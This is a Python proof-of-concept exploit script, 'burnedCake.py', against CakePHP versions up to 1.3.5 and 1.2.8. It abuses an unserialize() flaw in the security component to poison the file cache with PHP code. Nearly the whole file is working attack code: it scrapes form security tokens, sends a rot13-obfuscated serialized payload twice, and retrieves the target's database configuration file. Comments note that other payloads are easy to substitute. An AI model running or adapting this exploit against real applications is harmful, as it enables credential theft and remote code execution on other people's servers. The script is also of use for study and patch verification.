#!/usr/bin/python
#
# burnedCake.py - CakePHP <= 1.3.5 / 1.2.8 Cache Corruption Exploit
# written by felix@malloc.im
#
# This code exploits a unserialize() vulnerability in the CakePHP security
# component. See http://malloc.im/CakePHP-unserialize.txt for a detailed
# analysis of the vulnerability.
#
# The exploit should work against every CakePHP based Application, that
# uses POST forms with security tokens and hasn't changed the Cache 
# configuration (file-system caching is standard). Exploiting
# other caching configurations is possible but not as elegant.
#
# This POC will output the database config file of the running CakePHP Application,
# other payloads are easily possibe with a changed PHP Code.

from optparse import OptionParser
from urlparse import urlparse,urljoin
import urllib2
import urllib
import re

def request(url,data="",headers={},debug=0):
    if (data==""):
        request = urllib2.Request(url=url,headers=headers)
    else:
        request = urllib2.Request(url=url,headers=headers,data=data)
        
    debug_handler = urllib2.HTTPHandler(debuglevel = debug)
    opener = urllib2.build_opener(debug_handler)
    response=opener.open(request)
    return response


if __name__=="__main__":

    parser = OptionParser(usage="usage: %prog [options] url") 
    parser.add_option("-p", "--post", dest="post",
                      help="additional post content as urlencoded string")
    parser.add_option("-v", action="store_true", dest="verbose", 
                      help="verbose mode")

    (options, args) = parser.parse_args()
    if len(args)!=1:
        parser.error("wrong number of arguments")
    if options.verbose:
        debug=1
    else: 
        debug=0
    if not options.post:
        options.post=""
    url=urlparse(args[0])
    html=request(url.geturl(),debug=debug ).read()

    try:
        key=re.search("data\[_Token\]\[key\]\" value=\"(.*?)\"",html).group(1)
        path=re.search('method="post" action="(.*?)"',html).group(1)
        fields=re.search('data\[_Token\]\[fields\]" value="([0-9a-f]{32}).*?"',html).group(1)
    except:
        print "[x] Regex failed! :("
        exit()

    # Add additional POST variables with the -p option, if they are needed for the
    # Form to be accepted. Example: Croogo Admin Panel Login 
    if options.post:
        options.post="&"+options.post

    # This is a rot13 "encrypted" serialized CakePHP Object
    # This object will write 2 values in the cake_core_file_map Cache:
    # The PHP payload (readfile(....); exit();) and a new value 
    # for the Core/Router entry that shows to the Cache representation
    # on the filesystem (tmp/cache/persistent_cake_core_filemap).
    # CakePHP tries to include the Router class and our payload
    # get's executed ==> Owned. (See the advisory for more details)

    payload='%3AB:3:"Ncc":4:{f:7:"__pnpur";f:3:"onz";f:5:"__znc";n:2:{f:4'+\
    ':"Pber";n:1:{f:6:"Ebhgre";f:42:"../gzc/pnpur/crefvfgrag/pnxr_pber_sv'+\
    'yr_znc";}f:3:"Sbb";f:49:"<? ernqsvyr(\'../pbasvt/qngnonfr.cuc\'); rkv'+\
    'g(); ?>";}f:7:"__cnguf";n:0:{}f:9:"__bowrpgf";n:0:{}}'

    
    data={ "_method" : "POST", "data[_Token][key]" : key, 
           "data[_Token][fields]" : fields+payload }

    url=urljoin(url.geturl(),path)

    # We execute the same request twice.     
    # Our manipulated Cache write in the first request will be overwritten by 
    # the legitimate App Object. The second request won't trigger a normal Cache 
    # write again and our payload can get planted. 
    request(url,urllib.urlencode(data)+options.post,debug=debug).read()
    request(url,urllib.urlencode(data)+options.post,debug=debug).read()
    print request(url,debug=debug).read()




        

